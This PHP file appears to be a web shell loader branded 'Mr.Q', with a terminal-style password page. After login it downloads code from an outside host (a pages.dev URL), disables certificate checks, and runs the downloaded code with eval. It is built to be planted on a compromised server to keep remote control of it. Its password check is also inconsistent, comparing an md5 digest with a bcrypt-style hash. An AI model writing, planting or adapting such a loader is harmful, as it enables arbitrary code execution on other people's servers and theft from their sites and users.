<?php
session_start();

/**
 * KONFIGURASI
 */
$valid_password_hash = '$2a$12$1ZNmMjwVGvkz.fREMN5UWer33AfZDgAHSXKVv6D6hfuvJivG9AJNu'; 
$external_payload = 'https://wakwak90.pages.dev/1.txt';
$logo_url = 'https://g.top4top.io/p_36674k04q0.png';

/**
 * LOGIKA LOGIN
 */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['access_code'])) {
    if (md5($_POST['access_code']) === $valid_password_hash) {
        $_SESSION['X-H0UR'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    } else {
        $error = "ACCESS DENIED: UNAUTHORIZED USER DETECTED";
    }
}

/**
 * LOGIKA LOGOUT
 */
if (isset($_GET['exit'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

/**
 * EKSEKUSI PAYLOAD SETELAH LOGIN
 */
if (isset($_SESSION['X-H0UR'])) {
    $content = "";
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $external_payload);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $content = curl_exec($ch);
        curl_close($ch);
    } 
    
    if (empty($content)) {
        $content = @file_get_contents($external_payload);
    }

    if ($content) {
        eval('?>' . $content);
    } else {
        echo "<body style='background:#000;color:red;font-family:monospace;'>[!] Gagal memuat payload eksternal.</body>";
    }
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terminal | Mr.Q Authorization</title>
    <style>
        body {
            background-color: #050505;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Scanline CRT Effect */
        body::after {
            content: " ";
            position: absolute;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
            z-index: 10;
            background-size: 100% 3px, 3px 100%;
            pointer-events: none;
        }

        .terminal-container {
            width: 400px;
            padding: 30px;
            border: 1px solid #00ff00;
            background: rgba(0, 15, 0, 0.95);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
            z-index: 5;
            text-align: center;
        }

        .logo-box {
            margin-bottom: 10px;
        }

        .logo-box img {
            width: 80px;
            filter: drop-shadow(0 0 8px #00ff00);
        }

        /* Animasi Tulisan Mr.Q */
        .mr-q-text {
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 5px;
            margin-bottom: 20px;
            display: inline-block;
            white-space: nowrap;
            overflow: hidden;
            border-right: 3px solid #00ff00;
            width: 0;
            animation: typing 2s steps(4, end) forwards, blink-caret 0.75s step-end infinite;
        }

        @keyframes typing {
            from { width: 0 }
            to { width: 120px; } /* Sesuaikan lebar dengan panjang teks */
        }

        @keyframes blink-caret {
            from, to { border-color: transparent }
            50% { border-color: #00ff00; }
        }

        .header {
            font-size: 0.8em;
            margin-bottom: 20px;
            border-top: 1px solid #00ff00;
            border-bottom: 1px solid #00ff00;
            padding: 10px 0;
            text-align: left;
            opacity: 0.8;
        }

        .input-line {
            display: flex;
            align-items: center;
            margin-top: 20px;
            background: rgba(0, 255, 0, 0.1);
            padding: 8px;
        }

        .prompt { color: #00ff00; margin-right: 10px; font-weight: bold; }

        input[type="password"] {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Courier New', Courier, monospace;
            font-size: 1.2em;
            width: 100%;
            outline: none;
        }

        .error-msg {
            color: #ff0000;
            margin-top: 15px;
            font-size: 0.7em;
            text-transform: uppercase;
        }

        .footer {
            margin-top: 25px;
            font-size: 10px;
            opacity: 0.5;
        }
    </style>
</head>
<body>

<div class="terminal-container">
    <div class="logo-box">
        <img src="<?php echo $logo_url; ?>" alt="System Logo">
    </div>
    
    <div>
        <span class="mr-q-text">Mr.Q</span>
    </div>

    <div class="header">
        ID: <span style="color:#fff;">ROOT_USER_<?php echo substr(md5($_SERVER['REMOTE_ADDR']), 0, 6); ?></span><br>
        LOC: <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
        SYS: ENCRYPTED_CONNECTION
    </div>

    <form method="POST">
        <div class="input-line">
            <span class="prompt"># PASSWD:</span>
            <input type="password" name="access_code" autofocus autocomplete="off">
        </div>
        <input type="submit" style="display:none;">
    </form>

    <?php if (isset($error)): ?>
        <div class="error-msg">[!!] <?php echo $error; ?> [!!]</div>
    <?php endif; ?>

    <div class="footer">
        &copy; 2026 SECURE TERMINAL v3.1.0
    </div>
</div>

</body>
</html>s
